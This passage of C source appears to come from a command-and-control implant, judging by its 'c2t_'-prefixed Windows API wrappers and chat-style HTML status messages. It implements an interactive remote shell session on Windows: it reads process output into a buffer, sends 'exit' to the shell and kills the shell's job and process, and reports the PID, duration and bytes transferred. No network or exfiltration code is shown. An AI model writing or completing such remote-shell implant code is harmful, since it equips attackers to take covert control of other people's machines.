          DWORD ex_r = extra_avail < sizeof(ex_buf) ? extra_avail : sizeof(ex_buf);
          DWORD ex_bread = 0;
          if (c2t_ReadFile(g_win_session.hStdoutRead, ex_buf, ex_r, &ex_bread, NULL) && ex_bread > 0) {
            if (total_read + ex_bread + 1 <= capacity) {
              memcpy(buffer + total_read, ex_buf, ex_bread);
              total_read += ex_bread;
              buffer[total_read] = '\0';
            }
          }
        }
        break;
      }
    }
    c2t_WaitForSingleObject(g_win_session.hProcess, 25);
  }

  g_win_session.total_output_bytes += total_read;
  result->duration_ms = c2t_GetTickCount64() - start_time;
  result->output = buffer;
  result->output_len = total_read;
  buffer[total_read] = '\0';

  c2t_LeaveCriticalSection(&g_win_session.cs);
  return 1;
}

int c2t_shell_windows_session_stop(char *out_msg, size_t out_msg_cap) {
  ensure_session_cs_init();
  c2t_EnterCriticalSection(&g_win_session.cs);

  if (!g_win_session.is_active) {
    if (out_msg && out_msg_cap > 0) {
      snprintf(out_msg, out_msg_cap, "⚪ <i>No interactive shell session is currently active.</i>");
    }
    c2t_LeaveCriticalSection(&g_win_session.cs);
    return 1;
  }

  DWORD pid = g_win_session.pid;
  uint64_t dur = (c2t_GetTickCount64() - g_win_session.start_time_ms) / 1000ULL;
  uint64_t in_b = g_win_session.total_input_bytes;
  uint64_t out_b = g_win_session.total_output_bytes;

  DWORD written = 0;
  c2t_WriteFile(g_win_session.hStdinWrite, "exit\r\n", 6, &written, NULL);
  c2t_WaitForSingleObject(g_win_session.hProcess, 100);

  if (g_win_session.hJob) {
    c2t_TerminateJobObject(g_win_session.hJob, 1);
    c2t_CloseHandle(g_win_session.hJob);
  }
  if (g_win_session.hProcess) {
    c2t_TerminateProcess(g_win_session.hProcess, 1);
    c2t_CloseHandle(g_win_session.hProcess);
  }
  if (g_win_session.hThread) c2t_CloseHandle(g_win_session.hThread);
  if (g_win_session.hStdinWrite) c2t_CloseHandle(g_win_session.hStdinWrite);
  if (g_win_session.hStdoutRead) c2t_CloseHandle(g_win_session.hStdoutRead);

  memset(&g_win_session, 0, sizeof(g_win_session));
  g_win_session.initialized = 1;

  if (out_msg && out_msg_cap > 0) {
    snprintf(out_msg, out_msg_cap,
             "🛑 <b>Interactive Shell Session Closed</b>\n\n"
             "• <b>PID:</b> <code>%lu</code>\n"
             "• <b>Duration:</b> %llu s\n"
             "• <b>Total I/O:</b> %llu bytes in / %llu bytes out\n\n"
             "✅ <i>Session resources freed cleanly.</i>",
             (unsigned long)pid, (unsigned long long)dur, (unsigned long long)in_b,
             (unsigned long long)out_b);
  }

  c2t_LeaveCriticalSection(&g_win_session.cs);
  return 1;
}

int c2t_shell_windows_session_get_info(c2t_shell_session_info_t *info) {
  if (!info)
    return 0;

  ensure_session_cs_init();
  c2t_EnterCriticalSection(&g_win_session.cs);

  check_win_session_idle_watchdog();

  if (g_win_session.is_active && g_win_session.hProcess) {
    DWORD exit_code = 0;
    if (!c2t_GetExitCodeProcess(g_win_session.hProcess, &exit_code) || exit_code != STILL_ACTIVE) {
      g_win_session.is_active = 0;
    }
  }

  info->is_active = g_win_session.is_active;
  info->pid = (uint64_t)g_win_session.pid;
  info->start_time_ms = g_win_session.start_time_ms;
  info->last_activity_ms = g_win_session.last_activity_ms;
  info->total_input_bytes = g_win_session.total_input_bytes;
  info->total_output_bytes = g_win_session.total_output_bytes;
  info->shell_type = g_win_session.shell_type;
  strncpy(info->shell_name, g_win_session.shell_name, sizeof(info->shell_name) - 1);
  info->shell_name[sizeof(info->shell_name) - 1] = '\0';

  c2t_LeaveCriticalSection(&g_win_session.cs);
  return 1;
}

#endif /* _WIN32 */
